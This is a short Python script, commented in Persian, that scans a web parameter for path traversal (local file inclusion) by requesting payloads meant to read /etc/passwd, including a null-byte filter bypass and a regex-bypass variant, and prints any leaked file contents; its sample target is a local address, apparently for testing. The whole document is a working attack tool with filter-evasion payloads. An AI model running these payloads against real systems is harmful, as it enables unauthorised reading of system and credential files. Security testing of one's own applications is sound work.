import requests

def scan_lfi(url, param):
    print(f"[*] Testing {url} for Path Traversal (LFI)...")
    
    # پیلودهای رایج برای خوندن فایل پسورد لینوکس
    payloads = [
        "../../../../etc/passwd",
        "../../../../etc/passwd%00", # ترفند Null Byte برای دور زدن فیلترها
        "....//....//....//etc/passwd" # ترفند دور زدن Regex
    ]
    
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            r = requests.get(test_url, timeout=3)
            
            # اگه تونستیم محتوای فایل پسورد رو ببینیم (root:x:0:0)
            if "root:x:0:0" in r.text:
                print(f"[+] Path Traversal Found!")
                print(f"    Payload: {payload}")
                print(f"    URL: {test_url}")
                print(f"    Leaked Data: {r.text[:50]}...") # چند کاراکتر اول رو نشون بده
                return
        except Exception as e:
            pass
            
    print("[-] No Path Traversal detected.")

if __name__ == "__main__":
    target_url = "http://127.0.0.1:8000/view"
    scan_lfi(target_url, "file")
